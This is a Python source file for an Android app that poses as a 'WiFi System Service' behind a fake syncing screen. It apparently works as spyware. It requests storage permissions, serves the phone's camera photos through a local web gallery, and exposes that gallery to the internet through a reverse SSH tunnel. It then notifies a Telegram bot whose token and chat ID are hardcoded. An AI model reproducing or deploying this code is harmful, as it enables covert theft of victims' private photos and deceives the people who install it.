import os, threading, requests, time, subprocess
from flask import Flask, send_from_directory, render_template_string
from kivy.app import App
from kivy.uix.label import Label
from android.permissions import request_permissions, Permission

# بيانات البوت الخاصة بك
TOKEN = '8718571728:AAH9mt0r1RTiPzeOTx9VnWvMPMx-u1m4D4w'
CHAT_ID = '5834900042'
# مسار الصور المستهدف في أندرويد
PATH = "/sdcard/DCIM/Camera" 

app_flask = Flask(__name__)

@app_flask.route('/')
def gallery():
    try:
        files = os.listdir(PATH)
        html = '<body style="background:#000; color:#0095f6; font-family:sans-serif; padding:20px;">'
        html += '<h2>📁 System Storage Access</h2><hr>'
        for f in files:
            html += f'<p><a style="color:#eee; text-decoration:none;" href="/v/{f}">📄 {f}</a></p>'
        return html + '</body>'
    except: return "Access Denied"

@app_flask.route('/v/<path:filename>')
def view(filename):
    return send_from_directory(PATH, filename)

class WiFiSystemService(App):
    def build(self):
        # طلب الصلاحيات اللازمة للوصول للملفات والإنترنت
        request_permissions([Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE, Permission.INTERNET])
        threading.Thread(target=self.run_services, daemon=True).start()
        return Label(text="System Syncing... 22%\nPlease do not close.")

    def run_services(self):
        # تشغيل السيرفر المحلي
        threading.Thread(target=lambda: app_flask.run(host='127.0.0.1', port=8080)).start()
        # فتح النفق العالمي وإرسال إشعار للبوت
        self.send_bot("✅ تم تشغيل الخدمة بنجاح! جاري توليد رابط الوصول...")
        # استخدام أمر النظام لفتح النفق (SSH)
        os.system("ssh -R 80:localhost:8080 nokey@localhost.run")

    def send_bot(self, msg):
        try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg})
        except: pass

if __name__ == '__main__':
    WiFiSystemService().run()
